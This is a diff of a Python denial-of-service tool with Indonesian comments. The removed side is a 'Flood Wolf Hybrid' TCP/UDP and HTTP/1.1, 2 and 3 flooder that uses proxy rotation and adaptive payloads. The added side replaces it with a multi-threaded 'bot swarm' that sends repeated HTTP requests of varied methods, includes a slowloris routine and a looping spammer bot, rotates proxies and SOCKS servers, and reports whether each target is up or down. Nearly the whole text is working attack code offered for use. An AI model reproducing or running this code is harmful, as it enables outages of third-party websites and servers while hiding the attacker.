-                    status_codes[r.status_code] = status_codes.get(r.status_code, 0) + 1
-                    ui.tick_ok(f"HTTP/1.1 [{r.status_code}] via {proxy if proxy else 'DIRECT'} mode={mode}", send_size)
-                except Exception as e:
-                    latency = time.time() - start
-                    last_status = None
-                    adaptive_payload_q(ua, None, latency, error_type="timeout", proxy=proxy)
-                    ui.tick_fail(f"HTTP/1.1 FAIL: {str(e)}")
+    loop_count = 0
+    while True:
+        for iteration in range(spammer_iterations):
+            target = random.choice(targets)
+            
+            if target.startswith("ip://"):
+                host = target.replace("ip://","")
+                path = "/"
+                tport = 80
             else:
-                # TCP + UDP fallback
-                try:
-                    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-                    s.settimeout(2)
-                    s.connect((ip, port))
-                    s.sendall(payload)
-                    s.close()
-                    latency = time.time() - start
-                    adaptive_payload_q(ua, 200, latency, proxy=proxy)
-                    ui.tick_ok(f"TCP -> {ip}:{port} mode={mode}", send_size)
-                except Exception as e:
-                    latency = time.time() - start
-                    adaptive_payload_q(ua, None, latency, error_type="tcp_fail", proxy=proxy)
-                    ui.tick_fail(f"TCP FAIL: {str(e)}")
-
-                try:
-                    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-                    s.sendto(payload, (ip, port))
-                    s.close()
-                    latency = time.time() - start
-                    adaptive_payload_q(ua, 200, latency, proxy=proxy)
-                    ui.tick_ok(f"UDP -> {ip}:{port} mode={mode}", send_size)
-                except Exception as e:
-                    latency = time.time() - start
-                    adaptive_payload_q(ua, None, latency, error_type="udp_fail", proxy=proxy)
-                    ui.tick_fail(f"UDP FAIL: {str(e)}")
-
-        except Exception as e:
-            ui.tick_fail(str(e))
-
-        adaptive_sleep(latency, delay_min, delay_max)
-
-# === HTTP/2 mode (aiohttp) ===
-async def send_packet_async(ip, port, ui, delay_min, delay_max, proxies=None, target_url=None):
-    proxy_index = 0
-    connector = TCPConnector(ssl=False)
-    timeout = ClientTimeout(total=5)
-    last_status = None
-
-    async with ClientSession(connector=connector, timeout=timeout) as session:
-        while not ui.stopped():
+                parsed = urllib.parse.urlparse(target)
+                host = parsed.netloc if parsed.netloc else "127.0.0.1"
+                path = parsed.path if parsed.path else "/"
+                tport = 443 if parsed.scheme=="https" else 80
+            
             try:
-                ua = random.choice(user_agents)
-                start = time.time()
-                payload, send_size, mode = adaptive_payload_q(ua, last_status)
-
-                proxy = None
-                if proxies:
-                    proxy = proxies[proxy_index]
-                    proxy_index = (proxy_index + 1) % len(proxies)
-
+                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+                s.settimeout(2)
+                
+                if not target.startswith("ip://") and tport == 443:
+                    context = ssl.create_default_context()
+                    s = context.wrap_socket(s, server_hostname=host)
+                
+                s.connect((host, tport))
+                stats_global["hits"] += 1
+                stats_bot["Spammer"]["hits"] += 1
+                stats_target[target]["hits"] += 1
+                
+                # Send simple GET request
+                request = f"GET {path} HTTP/1.1\r\nHost: {host}\r\n"
+                request += generate_headers("Spammer", target)
+                request += "Connection: close\r\n\r\n"
+                
+                s.send(request.encode(errors="ignore"))
+                stats_global["sent"] += 1
+                stats_bot["Spammer"]["sent"] += 1
+                stats_target[target]["sent"] += 1
+                
+                # Try to receive response (to simulate real visit)
                 try:
-                    target_path = choose_endpoint()
-                    h2_settings = random_h2_settings()
-                    async with session.post(target_url + target_path,
-                                            headers=consistent_headers(ua, payload),
-                                            data=payload,
-                                            proxy=proxy if proxy else None) as resp:
-                        await resp.read()
-                        latency = time.time() - start
-                        last_status = resp.status
-                        adaptive_payload_q(ua, last_status, latency, proxy=proxy)
-                        status_codes[resp.status] = status_codes.get(resp.status, 0) + 1
-                        ui.tick_ok(f"HTTP/2 via {proxy if proxy else 'DIRECT'} [{resp.status}] mode={mode}", send_size)
-                        ui.set_attack_mode("HTTP2",
-                                           status_codes.get(200, 0),
-                                           sum(status_codes.values()) - status_codes.get(200, 0))
-                        if proxy and resp.status == 200:
-                            update_proxy_stats(proxy, success=True)
-                except Exception as e:
-                    latency = time.time() - start
-                    adaptive_payload_q(ua, None, latency, error_type="timeout", proxy=proxy)
-                    last_status = None
-                    ui.tick_fail(f"HTTP/2 FAIL: {str(e)}")
-                    if proxy:
-                        update_proxy_stats(proxy, success=False)
+                    s.recv(1024)
+                except:
+                    pass
+                
+                s.close()
+                
+                # Progress indicator
+                progress = f"[{iteration+1}/{spammer_iterations}]"
+                print(f"{M}[SPAMMER]{R} {progress} → {target[:50]} | Loop: {loop_count+1} | Sent={stats_bot['Spammer']['sent']} | Hits={stats_bot['Spammer']['hits']}")
+                
+                time.sleep(random.uniform(0.01, 0.1))
+                
             except Exception as e:
-                ui.tick_fail(str(e))
+                stats_global["error"] += 1
+                stats_bot["Spammer"]["error"] += 1
+                stats_target[target]["error"] += 1
+                stats_global["fail"] += 1
+                stats_bot["Spammer"]["fail"] += 1
+                stats_target[target]["fail"] += 1
+                try:
+                    s.close()
+                except:
+                    pass
+        
+        loop_count += 1
+        print(f"{M}{B}[SPAMMER]{R} Completed loop #{loop_count} - Restarting...")
+        time.sleep(0.5)
 
-            await adaptive_sleep_async(latency, delay_min, delay_max)
+import requests  # pastikan sudah install requests[socks]
 
-# === HTTP/3 mode (aioquic) ===
-async def send_packet_http3(ip, port, ui, delay_min, delay_max, target_url=None):
-    last_status = None
-    while not ui.stopped():
-        try:
-            ua = random.choice(user_agents)
-            start = time.time()
-            payload, send_size, mode = adaptive_payload_q(ua, last_status)
-            color = mode_colors.get(mode, "white")
+# ===================== PROXY CONFIGURATION =====================
+use_proxy = str(input(f'{G}[?]{R} Aktifkan Proxy dari proxy.txt? (y/n): ')).lower()
+proxies = []
+proxy_index = 0
 
-            config = QuicConfiguration(is_client=True, alpn_protocols=H3_ALPN)
-            config.cipher_suites = randomize_cipher_suites()
+if use_proxy == 'y':
+    try:
+        with open("proxy.txt","r") as pf:
+            proxies = [line.strip() for line in pf if line.strip()]
+        print(f"{G}[✓]{R} Loaded {len(proxies)} proxies from proxy.txt")
+        print(f"{C}Format supported:{R} http://ip:port | https://ip:port | socks4://ip:port | socks5://ip:port")
+    except Exception as e:
+        print(f"{M}[✗]{R} Error membaca proxy.txt: {e}")
+        proxies = []
+else:
+    print(f"{K}[!]{R} Proxy mode dinonaktifkan")
 
-            target_path = choose_endpoint()
-            async with connect(ip, port, configuration=config) as client:
-                h3 = client.http
-                stream_id = h3.get_next_available_stream_id()
+# ===================== MAIN BOT ATTACK FUNCTION =====================
+# Tambahin dict global untuk nyimpen status code
+status_counts = {}
 
-                headers = [
-                    (b":method", b"POST"),
-                    (b":scheme", b"https"),
-                    (b":authority", ip.encode()),
-                    (b":path", target_path.encode()),
-                    (b"user-agent", ua.encode()),
-                    (b"x-mode", mode.encode())
-                ]
-
-                h3.send_headers(stream_id, headers)
-                h3.send_data(stream_id, payload, end_stream=True)
-
-                events = await client.wait_for_events()
-                if not events:
-                    latency = time.time() - start
-                    adaptive_payload_q(ua, None, latency, error_type="no_response")
-                    last_status = None
-                    ui.tick_fail("HTTP/3 no response")
-                else:
-                    for ev in events:
-                        if hasattr(ev, "headers"):
-                            latency = time.time() - start
-                            last_status = 200
-                            adaptive_payload_q(ua, last_status, latency)
-                            ui.tick_ok(f"[{color}]HTTP/3 headers {ev.headers} mode={mode}[/]", send_size)
-                            status_codes[200] = status_codes.get(200, 0) + 1
-                            ui.set_attack_mode("HTTP3",
-                                               status_codes.get(200, 0),
-                                               sum(status_codes.values()) - status_codes.get(200, 0))
-        except Exception as e:
-            latency = time.time() - start
-            adaptive_payload_q(ua, None, latency, error_type="http3_fail")
-            last_status = None
-            ui.tick_fail(f"HTTP/3 FAIL: {str(e)}")
-
-        await adaptive_sleep_async(latency, delay_min, delay_max)
-# === Attack dispatcher (Q-Learning) ===
-def attack(ip, port, threads, delay_min, delay_max, ui, proxies=None, target_url=None, http_mode=None):
-    ui.stats.active_threads = threads
-
-    if http_mode == "1":  # HTTP/1.1
-        for _ in range(threads):
-            threading.Thread(target=send_packet,
-                             args=(ip, port, ui, delay_min, delay_max, proxies, target_url),
-                             daemon=True).start()
-        with ui.live() as live:
-            while not ui.stopped():
-                ui.update_live(live)
-                time.sleep(0.2)
-
-    elif http_mode == "2":  # HTTP/2
-        loop = asyncio.new_event_loop()
-        asyncio.set_event_loop(loop)
-        tasks = [loop.create_task(send_packet_async(ip, port, ui, delay_min, delay_max, proxies, target_url))
-                 for _ in range(threads)]
-        try:
-            with ui.live() as live:
-                while not ui.stopped():
-                    ui.update_live(live)
-                    loop.run_until_complete(asyncio.sleep(0.2))
-        except KeyboardInterrupt:
-            ui._stop = True
-            for task in tasks:
-                task.cancel()
-
-    elif http_mode == "3":  # HTTP/3
-        loop = asyncio.new_event_loop()
-        asyncio.set_event_loop(loop)
-        tasks = [loop.create_task(send_packet_http3(ip, port, ui, delay_min, delay_max, target_url))
-                 for _ in range(threads)]
-        try:
-            with ui.live() as live:
-                while not ui.stopped():
-                    ui.update_live(live)
-                    loop.run_until_complete(asyncio.sleep(0.2))
-        except KeyboardInterrupt:
-            ui._stop = True
-            for task in tasks:
-                task.cancel()
-
-    else:  # IP mode → TCP/UDP flood
-        for _ in range(threads):
-            threading.Thread(target=send_packet,
-                             args=(ip, port, ui, delay_min, delay_max, None, None),
-                             daemon=True).start()
-        with ui.live() as live:
-            while not ui.stopped():
-                ui.update_live(live)
-                time.sleep(0.2)
-# === Menu input ===
-def menu():
-    os.system("clear")
-    console.print(Panel.fit(Text(BANNER, style="red"),
-                            title="[bold red]Flood Wolf Hybrid[/bold red]",
-                            border_style="red"))
-    console.print("[bold cyan]=== Traffic Test Tool Hybrid ===[/bold cyan]\n")
-
-    target = console.input("[bold red][+] Masukkan target IP/URL: [/bold red] ").strip()
-    display_target = target
-
-    if target.startswith("http://") or target.startswith("https://"):
-        parsed = urlparse(target)
-        ip = socket.gethostbyname(parsed.hostname) if parsed.hostname else target
-        port = 443 if parsed.scheme == "https" else 80
-        target_url = target
-        http_mode = console.input("[bold red][+] Pilih mode HTTP (1=HTTP/1.1, 2=HTTP/2, 3=HTTP/3): [/bold red] ").strip()
-    else:
-        ip = target
-        port_input = console.input("[bold red][+] Masukkan port (80/443 atau kosong untuk acak): [/bold red] ").strip()
-        if port_input:
-            try:
-                port = int(port_input)
-            except ValueError:
-                console.print("[red][!] Port harus berupa angka. Default ke 80.[/red]")
-                port = 80
+def start(botname):
+    global stats_global, stats_bot, stats_target, proxy_index, status_counts
+    while True:
+        target = random.choice(targets)
+        if target.startswith("ip://"):
+            host = target.replace("ip://","")
+            path = "/"
+            tport = 80
         else:
-            # 🔥 kalau kosong → random port
-            port = random.randint(1024, 65535)
-        target_url = None
-        http_mode = None
+            parsed = urllib.parse.urlparse(target)
+            host = parsed.netloc if parsed.netloc else "127.0.0.1"
+            path = parsed.path if parsed.path else "/"
+            tport = 443 if parsed.scheme=="https" else 80
+        try:
+            # === Proxy mode (HTTP/HTTPS/SOCKS) ===
+            if use_proxy == 'y' and proxies:
+                proxy = proxies[proxy_index % len(proxies)]
+                proxy_index += 1
+                try:
+                    resp = requests.get(
+                        target,
+                        headers={'User-Agent': random.choice(useragents)},
+                        proxies={'http': proxy, 'https': proxy},  # bisa http:// atau socks5://
+                        timeout=5
+                    )
+                    status_code = resp.status_code
 
-    threads_input = console.input("[bold red][+] Masukkan jumlah threads: [/bold red] ").strip()
-    threads = int(threads_input) if threads_input else 100
+                    # catat status code ke dict global
+                    status_counts[status_code] = status_counts.get(status_code, 0) + 1
 
-    delay_min_input = console.input("[bold red][+] Masukkan delay minimum (detik): [/bold red] ").strip()
-    delay_max_input = console.input("[bold red][+] Masukkan delay maksimum (detik): [/bold red] ").strip()
-    delay_min = float(delay_min_input) if delay_min_input else 0.1
-    delay_max = float(delay_max_input) if delay_max_input else 0.5
+                    stats_global["hits"]+=1; stats_bot[botname]["hits"]+=1; stats_target[target]["hits"]+=1
+                    stats_global["sent"]+=1; stats_bot[botname]["sent"]+=1; stats_target[target]["sent"]+=1
 
-    use_proxy = console.input("[bold red][+] Gunakan proxy.txt? (y/n): [/bold red] ").strip().lower()
-    proxies = load_proxies("proxy.txt") if use_proxy == "y" else None
+                    # tentukan warna status code
+                    if status_code == 200:
+                        status_color = f"{B}{G}"   # bold green
+                    elif 300 <= status_code < 400:
+                        status_color = C           # cyan
+                    elif 400 <= status_code < 500:
+                        status_color = K           # yellow
+                    elif 500 <= status_code < 600:
+                        status_color = M           # red
+                    else:
+                        status_color = A           # gray
 
-    if http_mode == "3" and proxies:
-        console.print("[yellow][!] Mode HTTP/3 tidak mendukung proxy. Proxy akan diabaikan.[/yellow]")
-        proxies = None
+                    print(f"{C}[{botname} PROXY]{R} via {proxy} → {target[:40]} | Status={status_color}{status_code}{R} | Sent={stats_bot[botname]['sent']} | Hits={stats_bot[botname]['hits']}")
+                except Exception as e:
+                    stats_global["fail"]+=1; stats_bot[botname]["fail"]+=1; stats_target[target]["fail"]+=1
+                    print(f"{M}[FAIL PROXY]{R} {proxy} → {e}")
 
-    return ip, port, threads, delay_min, delay_max, proxies, display_target, target_url, http_mode
-# === Main runner ===
-def main():
-    ip, port, threads, delay_min, delay_max, proxies, display_target, target_url, http_mode = menu()
-    ui = HackerUI(tool_name="Flood Wolf Hybrid Brutal", user="ExProGm411")
+            # === Direct mode (kode asli) ===
+            else:
+                s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
+                s.settimeout(3)
+                if not target.startswith("ip://") and tport==443:
+                    context=ssl.create_default_context()
+                    s=context.wrap_socket(s,server_hostname=host)
+                s.connect((host,tport))
+                stats_global["hits"]+=1; stats_bot[botname]["hits"]+=1; stats_target[target]["hits"]+=1
 
-    alive = check_alive(ip, port if port else 80)
-    status_line = f"Keep-Alive: {'[green][+] Server aktif[/green]' if alive else '[red][-] Tidak responsif[/red]'}"
+                if botname=="Alpha": method="GET"
+                elif botname=="Bravo": method="POST"
+                elif botname=="Charlie": method=random.choice(["HEAD","OPTIONS"])
+                elif botname=="Delta": method="GET"
+                elif botname=="Echo": method="CHUNKED"
+                elif botname=="Foxtrot": method="COMPRESS"
+                elif botname=="Gamma": method=random.choice(["TRACE","PUT"])
+                else: method="GET"
 
-    # 🔥 Kumpulkan semua info untuk boot panel
-    boot_lines = [
-        f"Target: {display_target}",
-        f"IP: {ip}",
-        f"Port: {port if port else 'Random'}",
-        f"Threads: {threads}",
-        f"Delay: {delay_min}-{delay_max}s",
-        f"Proxy: {'ON' if proxies else 'OFF'}",
-        f"Mode: {http_mode if http_mode else 'TCP/UDP'}",
-        status_line
-    ]
+                main_req=build_request(method,botname,host,path,target)
+                s.send(main_req.encode(errors="ignore"))
+                stats_global["sent"]+=1; stats_bot[botname]["sent"]+=1; stats_target[target]["sent"]+=1
 
-    # 🔔 Tambahkan warning proxy khusus untuk HTTP/3
-    if http_mode == "3":
-        boot_lines.append("[yellow][!] Proxy tidak digunakan karena mode HTTP/3.[/yellow]")
+                for _ in range(pack):
+                    s.send(main_req.encode(errors="ignore"))
+                    stats_global["sent"]+=1; stats_bot[botname]["sent"]+=1; stats_target[target]["sent"]+=1
+                    time.sleep(random.choice([0.01,0.05,0.1,0.5,1.0]))
 
-    ui.boot(boot_lines)
+                if botname=="Delta": slowloris_attack(s,botname)
+                s.close()
 
-    # 🔫 Mulai serangan
-    attack(ip, port, threads, delay_min, delay_max, ui, proxies, target_url, http_mode)
+                # Print progress dengan warna per bot
+                bot_color = G if botname in ["Alpha","Bravo","Charlie"] else C if botname in ["Delta","Echo"] else O
+                print(f"{bot_color}[{botname.ljust(8)}]{R} → {target[:40].ljust(40)} | Sent={str(stats_bot[botname]['sent']).ljust(6)} | Hits={str(stats_bot[botname]['hits']).ljust(6)} | Monitor={stats_target[target]['monitor']}")
 
-    # 📊 Tampilkan report saat CTRL+C
-    ui.report()
+        except Exception:
+            stats_global["error"]+=1; stats_bot[botname]["error"]+=1; stats_target[target]["error"]+=1
+            try: s.close()
+            except: pass
+            stats_global["fail"]+=1; stats_bot[botname]["fail"]+=1; stats_target[target]["fail"]+=1
+            time.sleep(1)
 
-if __name__ == "__main__":
-    main()
+def slowloris_attack(sock,botname):
+    for _ in range(5):
+        try:
+            sock.send(f"X-KeepAlive-{rand_string(4)}: {rand_string(10)}\r\n".encode())
+            time.sleep(random.uniform(1,3))
+        except: break
 
+# ===================== TARGET MONITOR =====================
+def monitor_target(target,interval=5):
+    if target.startswith("ip://"):
+        host = target.replace("ip://","")
+        tport = 80
+    else:
+        parsed = urllib.parse.urlparse(target)
+        host = parsed.netloc if parsed.netloc else "127.0.0.1"
+        tport = 443 if parsed.scheme=="https" else 80
+    while True:
+        try:
+            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+            s.settimeout(2)
+            start_t = time.time()
+            s.connect((host, tport))
+            latency = (time.time() - start_t) * 1000
+            stats_target[target]["monitor"] = f"{G}UP ({latency:.2f}ms){R}"
+            s.close()
+        except:
+            stats_target[target]["monitor"] = f"{M}DOWN{R}"
+        time.sleep(interval)
 
+# ===================== START SYSTEM =====================
+print()
+print_border("═", 80, G)
+print(f"{B}{G}[SYSTEM STARTING]{R}")
+print_border("═", 80, G)
+print(f"{C}[⚡]{R} Initializing monitors...")
+
+# Jalankan monitor untuk semua target
+for t in targets:
+    th = threading.Thread(target=monitor_target, args=(t,))
+    th.daemon = True
+    th.start()
+    time.sleep(0.1)
+
+print(f"{G}[✓]{R} All monitors active")
+print(f"{C}[⚡]{R} Deploying bot swarm...")
+
+# Jalankan bot swarm (7 bot pertama)
+botnames = ["Alpha", "Bravo", "Charlie", "Delta", "Echo", "Foxtrot", "Gamma"]
+for x in range(thread_count):
+    botname = botnames[x % len(botnames)]
+    thred = threading.Thread(target=start, args=(botname,))
+    thred.daemon = True
+    thred.start()
+    time.sleep(0.05)
+
+print(f"{G}[✓]{R} {thread_count} bot threads deployed")
+
+# Jalankan Spammer Bot jika diaktifkan
+if enable_spammer == 'y' and spammer_iterations > 0:
+    print(f"{M}[⚡]{R} Launching SPAMMER BOT...")
+    spam_thread = threading.Thread(target=spammer_bot)
+    spam_thread.daemon = True
+    spam_thread.start()
+    time.sleep(0.1)
+    print(f"{M}{B}[✓] SPAMMER BOT ACTIVE - Loop mode with {spammer_iterations} iterations{R}")
+
+print_border("═", 80, G)
+print(f"{B}{C}[ATTACK INITIATED - Press Ctrl+C to stop]{R}")
+print_border("═", 80, C)
+print()
+
+start_time = datetime.now()
+
+# Deteksi IP public di awal
+print(f"{C}[⚡]{R} Detecting your public IP...")
+my_public_ip = get_public_ip()
+if "Unable" not in my_public_ip:
+    print(f"{G}[✓]{R} Your IP: {P}{my_public_ip}{R}")
+else:
+    print(f"{K}[!]{R} IP detection failed (offline mode?)")
+print()
+
+# ===================== MAIN LOOP + SUMMARY =====================
+try:
+    while True:
+        time.sleep(1)
+except KeyboardInterrupt:
+    end_time = datetime.now()
+    duration = (end_time - start_time).total_seconds()
+    
+    clear_screen()
+    print()
+    print_border("═", 80, M)
+    print(f"{B}{M}[⛔ ATTACK STOPPED - GENERATING REPORT]{R}")
+    print_border("═", 80, M)
+    print()
+    
+    # ===================== GLOBAL SUMMARY =====================
+    print(f"{B}📊 GLOBAL SUMMARY{R}")
+    print_border("─", 80, W)
+    print(f"{G}⏱️  Duration:{R} {duration:.2f} seconds")
+    print(f"{C}📤 Total Sent:{R} {stats_global['sent']:,}")
+    print(f"{G}🎯 Total Hits:{R} {stats_global['hits']:,}")
+    print(f"{K}❌ Total Fail:{R} {stats_global['fail']:,}")
+    print(f"{M}⚠️  Total Error:{R} {stats_global['error']:,}")
+    
+    if duration > 0:
+        rps = stats_global['sent'] / duration
+        print(f"{P}⚡ Requests/sec:{R} {rps:.2f}")
+    
+    # Tampilkan IP yang digunakan
+    ip_color = P if my_public_ip != "Unable to detect" else K
+    tor_indicator = ""
+    if my_public_ip != "Unable to detect":
+        if not my_public_ip.startswith(("192.", "10.", "172.")):
+            tor_indicator = f" {A}(via Proxy/Tor?){R}"
+    print(f"{C}🌐 My IP:{R} {ip_color}{my_public_ip}{R}{tor_indicator}")
+    
+    print()
+    
+    # ===================== STATUS CODE BREAKDOWN =====================
+    if use_proxy == 'y' and proxies:
+        print(f"{B}📊 STATUS CODE BREAKDOWN{R}")
+        print_border("─", 80, C)
+        header_status = f"{B}{'Status Code'.ljust(15)} {'Count'.ljust(10)}{R}"
+        print(header_status)
+        print_border("─", 80, A)
+        if 'status_counts' in globals():
+            for code, count in status_counts.items():
+                row_status = f"{G}{str(code).ljust(15)}{R} {str(count).ljust(10)}"
+                print(row_status)
+        else:
+            print(f"{K}[!]{R} Tidak ada data status code")
+        print()
+    
+    # ===================== BOT BREAKDOWN =====================
+    print_border("─", 80, C)
+    print(f"{B}📊 BOT BREAKDOWN{R}")
+    print_border("─", 80, C)
+    
+    header_bot = f"{B}{'Bot'.ljust(12)} {'Sent'.ljust(10)} {'Hits'.ljust(10)} {'Fail'.ljust(10)} {'Error'.ljust(10)}{R}"
+    print(header_bot)
+    print_border("─", 80, A)
+    
+    for bot, stat in sorted(stats_bot.items()):
+        bot_color = M if bot == "Spammer" else G if stat['sent'] > 0 else A
+        row_bot = f"{bot_color}{bot.ljust(12)}{R} {str(stat['sent']).ljust(10)} {str(stat['hits']).ljust(10)} {str(stat['fail']).ljust(10)} {str(stat['error']).ljust(10)}"
+        print(row_bot)
+    
+    print()
+    
+    # ===================== TARGET BREAKDOWN =====================
+    print_border("─", 80, C)
+    print(f"{B}📊 TARGET BREAKDOWN{R}")
+    print_border("─", 80, C)
+    
+    header_target = f"{B}{'Target'.ljust(45)} {'Sent'.ljust(8)} {'Hits'.ljust(8)} {'Fail'.ljust(8)} {'Monitor'.ljust(15)}{R}"
+    print(header_target)
+    print_border("─", 80, A)
+    
+    for target, stat in stats_target.items():
+        target_short = target[:45].ljust(45)
+        row_target = f"{target_short} {str(stat['sent']).ljust(8)} {str(stat['hits']).ljust(8)} {str(stat['fail']).ljust(8)} {stat['monitor']}"
+        print(row_target)
+    
+    print()
+    print_border("═", 80, G)
+    print(f"{B}{G}[✓] Report generated successfully{R}")
+    print(f"{DIM}Session ended at: {end_time.strftime('%Y-%m-%d %H:%M:%S')}{R}")
+    print_border("═", 80, G)
+    print()
+    
+    sys.exit(0)
 
